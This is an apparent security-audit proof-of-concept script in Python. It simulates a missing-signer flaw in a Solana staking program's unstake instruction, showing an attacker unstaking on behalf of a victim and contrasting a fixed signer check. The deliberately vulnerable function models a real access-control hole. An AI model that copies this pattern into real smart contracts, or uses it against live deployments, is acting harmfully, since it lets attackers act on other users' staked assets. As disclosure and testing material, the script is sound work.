"""Exploit PoC: Missing Signer on nft_holder in unstake (solana-staking SEM-002).

Demonstrates that anyone can call unstake for any holder because
nft_holder in UnstakeInstructionStruct is raw AccountInfo without
the Signer constraint.

Source: rpajo/solana-staking (lib.rs lines 170-186)
Vulnerable struct:
    #[derive(Accounts)]
    pub struct UnstakeInstructionStruct<'info> {
        #[account(mut)]
        pub staking_machine: Account<'info, StakingMachine>,
        #[account()]                          // <-- NO Signer constraint
        pub nft_holder: AccountInfo<'info>,
        #[account(seeds = [...], bump = bump)]
        pub nft_stake_data: ProgramAccount<'info, StakingAccount>,
        pub clock: Sysvar<'info, Clock>,
    }

Compare with stake, where nft_holder also lacks Signer but the CPI
to token::transfer implicitly requires it (holder must sign the transfer).
In unstake, there is NO CPI — so no implicit signer check exists.
"""
from dataclasses import dataclass


@dataclass
class StakingMachine:
    """Simulates the on-chain StakingMachine account."""
    staked_nfts: int = 0


@dataclass
class StakingAccount:
    """Simulates the on-chain StakingAccount PDA."""
    staking_date: int = 1000


class TransactionContext:
    """Simulates a Solana transaction context."""
    def __init__(self, signer: str):
        self.signer = signer


def unstake_vulnerable(
    ctx: TransactionContext,
    nft_holder_pubkey: str,
    staking_machine: StakingMachine,
    nft_stake_data: StakingAccount,
    clock_timestamp: int,
) -> bool:
    """Simulates the VULNERABLE unstake instruction.

    BUG: nft_holder is AccountInfo without Signer constraint.
    Anyone can pass any pubkey as nft_holder — Anchor will
    not verify that the transaction was signed by nft_holder.

    The PDA seeds check (seeds = [PREFIX, nft_holder, nft_token])
    only verifies that the PDA derivation matches, NOT that
    nft_holder actually signed the transaction.
    """
    # No signer check on nft_holder — anyone can provide any pubkey
    # The only check is PDA derivation: seeds = [prefix, nft_holder, nft_token]
    # But the attacker can compute this PDA for any holder
    time_diff = clock_timestamp - nft_stake_data.staking_date

    print(f"  unstake(nft_holder={nft_holder_pubkey})")
    print(f"    Transaction signer:  {ctx.signer}")
    print(f"    nft_holder provided: {nft_holder_pubkey}")
    print(f"    Signer == holder?    {ctx.signer == nft_holder_pubkey}")
    print(f"    time_diff: {time_diff}")
    print(f"    Result: OK (no signer check)")
    return True


def unstake_fixed(
    ctx: TransactionContext,
    nft_holder_pubkey: str,
    staking_machine: StakingMachine,
    nft_stake_data: StakingAccount,
    clock_timestamp: int,
) -> bool:
    """What the CORRECT unstake should enforce.

    nft_holder should be Signer<'info>, not AccountInfo<'info>.
    """
    if ctx.signer != nft_holder_pubkey:
        print(f"  unstake_fixed(nft_holder={nft_holder_pubkey})")
        print(f"    REJECTED: signer {ctx.signer} != holder {nft_holder_pubkey}")
        return False

    time_diff = clock_timestamp - nft_stake_data.staking_date
    print(f"  unstake_fixed(nft_holder={nft_holder_pubkey}) -> OK (signer verified)")
    return True


def main():
    print("=" * 60)
    print("EXPLOIT: Missing Signer on nft_holder in Unstake")
    print("=" * 60)

    machine = StakingMachine(staked_nfts=1)
    victim_stake = StakingAccount(staking_date=1000)

    victim = "VictimPubkey111111111111111111"
    attacker = "AttackerPubkey22222222222222222"

    # Step 1: Attacker calls unstake for VICTIM's NFT
    print("\nStep 1: Attacker calls unstake for victim's staked NFT")
    attacker_ctx = TransactionContext(signer=attacker)

    result = unstake_vulnerable(
        ctx=attacker_ctx,
        nft_holder_pubkey=victim,
        staking_machine=machine,
        nft_stake_data=victim_stake,
        clock_timestamp=2000,
    )

    assert result, "EXPLOIT: Attacker successfully called unstake for victim"

    # Step 2: Verify the fixed version rejects this
    print("\nStep 2: Fixed version rejects attacker")
    result_fixed = unstake_fixed(
        ctx=attacker_ctx,
        nft_holder_pubkey=victim,
        staking_machine=machine,
        nft_stake_data=victim_stake,
        clock_timestamp=2000,
    )

    assert not result_fixed, "Fixed version should reject non-signer"

    # Step 3: Verify the fixed version accepts the actual holder
    print("\nStep 3: Fixed version accepts actual holder")
    victim_ctx = TransactionContext(signer=victim)
    result_victim = unstake_fixed(
        ctx=victim_ctx,
        nft_holder_pubkey=victim,
        staking_machine=machine,
        nft_stake_data=victim_stake,
        clock_timestamp=2000,
    )

    assert result_victim, "Fixed version should accept actual holder"

    # Combined impact assessment
    print("\n" + "=" * 60)
    print("EXPLOIT RESULT:")
    print(f"  Attacker ({attacker[:20]}...) called unstake")
    print(f"  for victim ({victim[:20]}...) without signing.")
    print("  ")
    print("  In the actual program, this is a DoS vector:")
    print("  - Attacker can trigger unstake for any holder")
    print("  - Combined with TP1 (incomplete unstake), this is a no-op")
    print("  - But if unstake were fixed to return the NFT,")
    print("    an attacker could force-unstake anyone's NFT")
    print("  ")
    print("  Root cause: nft_holder is AccountInfo, not Signer")
    print("  Fix: Change to `pub nft_holder: Signer<'info>`")
    print("\n  >>> EXPLOIT CONFIRMED: Unauthorized unstake call <<<")
    print("=" * 60)


if __name__ == "__main__":
    main()
